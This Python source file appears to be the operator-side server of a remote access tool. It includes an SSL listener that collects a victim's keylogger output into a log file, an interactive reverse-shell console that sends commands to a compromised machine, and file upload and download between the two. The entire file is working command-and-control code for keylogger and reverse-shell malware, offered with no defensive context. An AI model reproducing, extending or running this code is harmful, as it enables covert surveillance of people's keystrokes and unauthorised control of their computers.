from threading import Thread
import tools
from colorama import Fore
from socket import timeout, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET 
import ssl
import socket
import logging
import os

BUFFER_SIZE = 1024
BUFFER_SIZE_ReverseShell = 1024 * 10


class SecureCommunication:

    def __init__(self, ip_address, port):
        self.keyFile = "priv.pem"
        self.certFile = "cert.crt"
        self.ip_address = ip_address
        self.port = port
        self.ssl_sock = None

    def secure_connect(self):
        sockt = socket.socket(AF_INET, SOCK_STREAM)
        sockt.bind((self.ip_address, self.port))
        sockt.listen(1)
        sockt.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            s_ssl = ssl.wrap_socket(sockt, keyfile=self.keyFile, certfile=self.certFile, server_side=True)
            print("\n[i] Waiting for client ...")
            self.ssl_sock, (ip, port) = s_ssl.accept()
            print("[i] Connected with: ", ip, ":", str(port))
            logging.info("Connected to {}:{}".format(ip, str(port)))
            return ip
        except socket.error as errorCode:
            print(Fore.RED + "[X] Error: {0}".format(errorCode))
            logging.error("Error:{0}".format(errorCode))

    def download_file(self, file_path):
        self.send_msg("[DOWN]" + file_path)
        data_size = int(self.recv_msg())
        if data_size > 0 :
            print("[i] Download file (size: ", data_size, "b )")
            logging.info("Download file (size: " + str(data_size) + "b )")
            data_raw = self.ssl_sock.recv(int(data_size))
            down_file_path = input("Entre file path that you want to download: ")
            tools.save_raw_file(down_file_path, data_raw)
            print("[i] File downloaded !")
        else:
            print(Fore.RED + "[X] Invalid file !")

    def upload_file(self, file_path):
        data_raw = tools.read_raw_file(file_path)
        data_size = os.path.getsize(file_path)
        if data_size > 0:
            self.send_msg("[UP]" + str(data_size))
            self.ssl_sock.write(data_raw)
            up_file_path = input("Entre file path that you want to upload: ")
            self.send_msg(up_file_path)
            print("[i] File upload size: ", data_size, "b")
        else:
            print(Fore.RED + "[X] Invalid file !")

    def send_msg(self, message):
        try:
            self.ssl_sock.write(message.encode())
        except timeout:
            print("[!] Warning:{0}".format(timeout))
            logging.warning("Warning:{0}".format(timeout))
        except ConnectionResetError:
            print(Fore.RED + "[X] Error:{0}".format(timeout))
            logging.error("Error:{0}".format(timeout))

    def recv_msg(self, bufferSize=BUFFER_SIZE):
        try:
            data = self.ssl_sock.recv(bufferSize)
            return data.decode()
        except timeout:
            print("[!] Warning:{0}".format(timeout))
            logging.warning("Warning:{0}".format(timeout))
        except ConnectionResetError:
            print(Fore.RED + "[X] Error:{0}".format(timeout))
            logging.error("Error:{0}".format(timeout))

    def clean_socket(self):
        try:
            self.ssl_sock.close()
        except timeout:
            print("[!] Warning:{0}".format(timeout))
            logging.warning("Warning:{0}".format(timeout))
        except ConnectionResetError:
            print(Fore.RED + "[X] Error:{0}".format(timeout))
            logging.error("Error:{0}".format(timeout))


class KeyloggerManager(SecureCommunication, Thread):

    def __init__(self, ip_address, port):
        super().__init__(ip_address, port)
        Thread.__init__(self)

    def run(self):
        secure_communication = SecureCommunication(self.ip_address, self.port)
        secure_communication.secure_connect()
        while True:
            data = secure_communication.recv_msg()
            tools.save_in_file("keylogger.log", data)
        secure_communication.clean_socket()


class ReverseShell(SecureCommunication):

    def __init__(self, ip_address, port):
        super().__init__(ip_address, port)

    def run(self):
        try:
            print("\n[!] Reverse shell connected back\n")
            command_to_send = input("Reverse shell> ")
            logging.info("Reverse shell cmd:{0}".format(command_to_send))

            while command_to_send is not "quit":
                self.send_msg(command_to_send)
                recv_encrypt_cmd = self.recv_msg(BUFFER_SIZE_ReverseShell)
                print(recv_encrypt_cmd, end="")
                command_to_send = input("")
                logging.info("Reverse shell cmd:{0}".format(command_to_send))
        except:
            print(Fore.RED + "[X] Error: ReverseShell")
            pass
